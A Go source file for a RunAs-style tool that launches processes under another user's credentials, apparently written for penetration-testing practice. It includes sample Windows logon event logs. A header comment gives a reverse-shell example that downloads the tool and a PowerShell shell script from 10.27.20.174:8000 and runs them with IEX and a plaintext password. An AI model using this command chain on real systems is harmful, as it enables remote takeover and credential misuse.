package main

import (
	"bufio"
	"flag"
	"fmt"
	"log"
	"os"
	"strconv"
	"strings"
	"syscall"
	"unicode/utf16"
	"unsafe"

	"golang.org/x/sys/windows"
)

// Found this below project which is awesome...
// https://github.com/antonioCoco/RunasCs/blob/master/README.md

/*
*
Event Viewer Logs with LOGON_WITH_PROFILE (4648 followed by 4624)
--------------------------------------------------------
EventID: 4648
A logon was attempted using explicit credentials.

Subject:

	Security ID:		4gr8local\Jerry.Wolf
	Account Name:		jerry.wolf (Logged on User)
	Account Domain:		4gr8local
	Logon ID:		0x1266BD1B
	Logon GUID:		{8d38364c-a656-9d20-c1f4-59bb6b688c11}

Account Whose Credentials Were Used:

	Account Name:		arnold.sharp (Account Used)
	Account Domain:		4gr8local
	Logon GUID:		{78328a34-fb87-b3c3-b8c7-a93c129ce57c}

EventID: 4624
An account was successfully logged on.

Subject:

	Security ID:		4gr8local\Jerry.Wolf
	Account Name:		jerry.wolf
	Account Domain:		4gr8local
	Logon ID:		0x1266BD1B

Logon Information:

	Logon Type:		2 - Interactive Login
	Restricted Admin Mode:	-
	Virtual Account:		No
	Elevated Token:		No

Impersonation Level:		Impersonation

New Logon:

	Security ID:		4gr8local\arnold.sharp
	Account Name:		arnold.sharp
	Account Domain:		4gr8local
	Logon ID:		0x1296E060
	Linked Logon ID:		0x0
	Network Account Name:	-
	Network Account Domain:	-
	Logon GUID:		{78328a34-fb87-b3c3-b8c7-a93c129ce57c}

Process Information:

	Process ID:		0xe28
	Process Name:		C:\Windows\System32\svchost.exe


Event Viewer Logs with LOGON_NETCREDENTIALS_ONLY (4624)
--------------------------------------------------------
An account was successfully logged on.

Subject:
	Security ID:		4gr8local\Jerry.Wolf
	Account Name:		jerry.wolf
	Account Domain:		4gr8local
	Logon ID:		0x1266BD1B

Logon Information:
	Logon Type:		9 - New Credentials
	Restricted Admin Mode:	-
	Virtual Account:		No
	Elevated Token:		No

Impersonation Level:		Impersonation

New Logon:
	Security ID:		4gr8local\Jerry.Wolf
	Account Name:		jerry.wolf
	Account Domain:		4gr8local
	Logon ID:		0x1297C2EC
	Linked Logon ID:		0x0
	Network Account Name:	arnold.sharp
	Network Account Domain:	4gr8.local
	Logon GUID:		{00000000-0000-0000-0000-000000000000}

Process Information:
	Process ID:		0xe28
	Process Name:		C:\Windows\System32\svchost.exe


Example of Reverse Shell - Hosted webserver at port 8000
---------------------------------------------------------
iwr -Uri http://10.27.20.174:8000/goRunAs.exe -UseBasicParsing -OutFile .\goRunAs.exe

.\goRunAs.exe -u bradly.marks -p Kokopelli123 -d 4gr8.local -e cmd.exe -a "/c echo IEX(New-Object Net.WebClient).DownloadString('http://10.27.20.174:8000/revshell.ps1') | powershell -noprofile -" -l 1 -t 5

revshell.ps1 is the basic plaintext Get-Shell from OSCP

**/

const (
	LOGON_WITH_PROFILE        = 0x00000001 // Creates or loads the user profile in the HKEY_USERS registry key
	LOGON_NETCREDENTIALS_ONLY = 0x00000002 // Does not load or create a user profile
)

var (
	// https://learn.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-createprocesswithlogonw
	advapi32           = syscall.NewLazyDLL("advapi32.dll")
	procCreateProcessW = advapi32.NewProc("CreateProcessWithLogonW")
)

func convertStringstoUTF16(s string) *uint16 {
	u, err := windows.UTF16PtrFromString(s)
	if err != nil {
		log.Fatalf("Unable to convert String to UTF16: %v\n", err)
	}
	return u
}

func utf16PtrToString(ptr *uint16) string {
	length := 0
	for {
		if *(*uint16)(unsafe.Pointer(uintptr(unsafe.Pointer(ptr)) + uintptr(length)*2)) == 0 {
			break
		}
		length++
	}

	// Create a slice from the pointer
	utf16Slice := (*[1 << 29]uint16)(unsafe.Pointer(ptr))[:length:length]

	// Decode back to UTF-8
	runes := utf16.Decode(utf16Slice)
	return string(runes)
}

func createProcessWithLogon(
	username string,
	domain string,
	password string,
	application string,
	commandLine string,
	logonflag int) (uint32, uint32, error) {
	var (
		startupInfo windows.StartupInfo
		processInfo windows.ProcessInformation
		err         error
	)

	// Convert strings to UTF16 pointers
	appName := convertStringstoUTF16(application)
	cmdLine := convertStringstoUTF16(commandLine)
	fmt.Printf("Command Line Executed: %s\n", utf16PtrToString(cmdLine))
	userName := convertStringstoUTF16(username)
	domainName := convertStringstoUTF16(domain)
	pass := convertStringstoUTF16(password)

	startupInfo.Cb = uint32(unsafe.Sizeof(startupInfo))

	var logonFlag int
	switch logonflag {
	case 1:
		logonFlag = LOGON_WITH_PROFILE
	case 2:
		logonFlag = LOGON_NETCREDENTIALS_ONLY
	default:
		logonFlag = LOGON_WITH_PROFILE
	}

	// Call CreateProcessWithLogonW
	ret, _, err := procCreateProcessW.Call(
		uintptr(unsafe.Pointer(userName)),
		uintptr(unsafe.Pointer(domainName)),
		uintptr(unsafe.Pointer(pass)),
		uintptr(logonFlag),
		uintptr(unsafe.Pointer(appName)),
		uintptr(unsafe.Pointer(cmdLine)),
		0,
		0,
		0,
		uintptr(unsafe.Pointer(&startupInfo)),
		uintptr(unsafe.Pointer(&processInfo)),
	)

	if ret == 0 {
		return 0, 0, fmt.Errorf("Create process failed: %v", err)
	}

	// Close handles
	windows.CloseHandle(processInfo.Thread)
	defer windows.CloseHandle(processInfo.Process)

	return uint32(processInfo.ProcessId), uint32(processInfo.ThreadId), nil
}

func gatherInput(info string) string {
	var input string
	reader := bufio.NewReader(os.Stdin)
	fmt.Printf("Enter %s: ", info)
	input, err := reader.ReadString('\n')
	if err != nil {
		log.Fatalf("Error reading %s: %v", info, err)
	}
	input = strings.TrimSpace(input)

	return input
}

func main() {

	var (
		username    string
		password    string
		domain      string
		program     string
		arguments   string
		interactive bool
		logonflag   int
		showHelp    bool
	)

	flag.StringVar(&username, "u", "", "Username")
	flag.StringVar(&username, "user", "", "Username")
	flag.StringVar(&password, "p", "", "Password")
	flag.StringVar(&password, "password", "", "Password")
	flag.StringVar(&domain, "d", "", "Domain")
	flag.StringVar(&domain, "domain", "", "Domain")
	flag.StringVar(&program, "e", "", "Program to execute")
	flag.StringVar(&program, "exec", "", "Program to execute")
	flag.StringVar(&arguments, "a", "", "Arguments for the program enclosed by quotes")
	flag.StringVar(&arguments, "args", "", "Arguments for the program enclosed by quotes")
	flag.BoolVar(&interactive, "i", false, "Interactive mode")
	flag.BoolVar(&interactive, "interactive", false, "Interactive mode")
	flag.IntVar(&logonflag, "l", 2, "Specify Logon Flag (1 - LOGON_WITH_PROFILE, 2 - LOGON_NETCREDENTIALS_ONLY)")
	flag.IntVar(&logonflag, "logonflag", 2, "Specify Logon Flag (1 - LOGON_WITH_PROFILE, 2 - LOGON_NETCREDENTIALS_ONLY)")
	flag.BoolVar(&showHelp, "h", false, "Show help message")
	flag.Usage = func() {
		fmt.Fprintf(os.Stderr, "Usage: goRunAs.exe [options]\n")
		fmt.Fprintln(os.Stderr, "Options:")
		fmt.Fprintln(os.Stderr, "-u string OR -user string")
		fmt.Fprintln(os.Stderr, "\tUsername")
		fmt.Fprintln(os.Stderr, "-p string OR -password string")
		fmt.Fprintln(os.Stderr, "\tPassword")
		fmt.Fprintln(os.Stderr, "-d string OR -domain string")
		fmt.Fprintln(os.Stderr, "\tDomain or use a \".\" for local computer")
		fmt.Fprintln(os.Stderr, "-e string OR -exec string")
		fmt.Fprintln(os.Stderr, "\tProgram to execute")
		fmt.Fprintln(os.Stderr, "-a string OR -args string")
		fmt.Fprintln(os.Stderr, "\tArguments for the program enclosed by quotes")
		// Interactive mode does not work through powershell.exe or powershell_ise.exe
		fmt.Fprintln(os.Stderr, "-i OR -interactive")
		fmt.Fprintln(os.Stderr, "\tInteractive Mode")
		fmt.Fprintln(os.Stderr, "-l OR -logonflag")
		fmt.Fprintln(os.Stderr, "\tSpecify the Logon Flag to Use")
		fmt.Fprintln(os.Stderr, "\t\t1 - LOGON_WITH_PROFILE")                  // This results in logontype 2 by default
		fmt.Fprintln(os.Stderr, "\t\t2 - LOGON_NETCREDENTIALS_ONLY (Default)") // This results in logontype 9 by default

	}
	flag.Parse()

	if showHelp {
		flag.Usage()
		os.Exit(0)
	}

	if interactive {
		var err error
		username = gatherInput("username")
		password = gatherInput("password")
		domain = gatherInput("domain")
		program = gatherInput("program to execute")
		logonflag, err = strconv.Atoi(gatherInput("logon flag (1 or 2)"))
		if err != nil {
			log.Fatalln("Logon Flag needs to be a 1 or a 2")
		}
	}

	if username == "" {
		flag.Usage()
		log.Fatalln("Username is required")
	}

	if password == "" {
		password = gatherInput("password")
	}

	// If domain is empty, assume local machine
	if domain == "" {
		domain = "."
	}

	if program == "" {
		flag.Usage()
		log.Fatalln("Specify the program to execute")
	}

	// Combine the command line and the arguments
	cmdLine := program
	if arguments != "" {
		cmdLine += " " + arguments
	}

	pid, tid, err := createProcessWithLogon(username, domain, password, program, cmdLine, logonflag)
	if err != nil {
		log.Fatalf("Error: %v", err)
	}
	fmt.Printf("PID: %d, TID: %d, Program: %s, Username: %s, Domain: %s\n", pid, tid, program, username, domain)
}
